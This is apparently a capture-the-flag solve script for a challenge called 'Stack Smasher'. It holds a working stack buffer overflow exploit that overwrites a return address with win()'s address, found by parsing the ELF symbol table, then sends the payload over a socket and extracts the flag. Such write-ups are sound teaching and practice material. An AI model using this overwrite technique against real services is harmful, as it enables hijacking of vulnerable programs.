"""Stack Smasher: login() reads 256 bytes into a 64-byte buffer, and there's
no canary and no PIE. Overwrite the saved return address with win(), whose
address is in the symbol table (nm smasher | grep win). 64 bytes of buffer
+ 8 of saved rbp = 72 bytes of padding. Jumping to win+1 skips its
`push rbp`, which keeps the stack 16-byte aligned for printf.
Usage: solve.py [host] [port] [path to smasher]"""
import re
import socket
import struct
import sys
from pathlib import Path

host = sys.argv[1] if len(sys.argv) > 1 else "localhost"
port = int(sys.argv[2]) if len(sys.argv) > 2 else 31337
binary = Path(sys.argv[3] if len(sys.argv) > 3 else Path(__file__).parent.parent / "dist" / "smasher")


def symbol(path, name):
    """Looks a symbol up in an ELF64 file's .symtab (what nm does)."""
    elf = path.read_bytes()
    shoff, = struct.unpack_from("<Q", elf, 0x28)
    shentsize, shnum = struct.unpack_from("<HH", elf, 0x3A)
    sections = [struct.unpack_from("<IIQQQQIIQQ", elf, shoff + i * shentsize) for i in range(shnum)]
    for s in sections:
        if s[1] != 2:  # SHT_SYMTAB
            continue
        strtab = sections[s[6]]
        for off in range(s[4], s[4] + s[5], 24):
            st_name, _, _, _, st_value, _ = struct.unpack_from("<IBBHQQ", elf, off)
            end = elf.index(b"\0", strtab[4] + st_name)
            if elf[strtab[4] + st_name : end] == name:
                return st_value
    raise SystemExit(f"{name!r} not found")


win = symbol(binary, b"win")
print(f"win() is at {win:#x}")
payload = b"A" * 72 + struct.pack("<Q", win + 1)

s = socket.create_connection((host, port), timeout=10)
s.recv(1024)
s.sendall(payload)
out = b""
while True:
    chunk = s.recv(1024)
    if not chunk:
        break
    out += chunk
print(re.search(rb"flag\{[^}]+\}", out).group(0).decode())
